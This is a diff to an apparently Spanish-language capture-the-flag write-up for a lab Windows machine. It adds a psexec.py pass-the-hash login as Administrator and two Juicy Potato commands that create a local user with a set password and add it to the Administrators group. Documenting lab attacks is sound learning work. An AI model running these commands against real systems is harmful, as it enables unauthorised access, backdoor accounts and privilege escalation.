@@ -79,5 +79,20 @@ Pruebo con NULL session y nada.
 ## Psexec.py
 
 ```
-psexec.py 
+psexec.py WORKGROUP/Administrator@10.10.10.63 -H e0fb1fb85756c24235ff238cbe81fe00
 ```
+
+## Juicy Potato
+
+Crear un nuevo usuario.
+
+```
+JuicyPotato.exe -t * -p c:\Windows\System32\cmd.exe -a "/c net user pos3idon pos3idon123$! /add" -l 1234
+```
+
+Agregar usuario nuevo al grupo Administrators
+
+```
+JuicyPotato.exe -t * -p c:\Windows\System32\cmd.exe -a "/c net localgroup Administrators pos3idon /add" -l 1234
+```
+
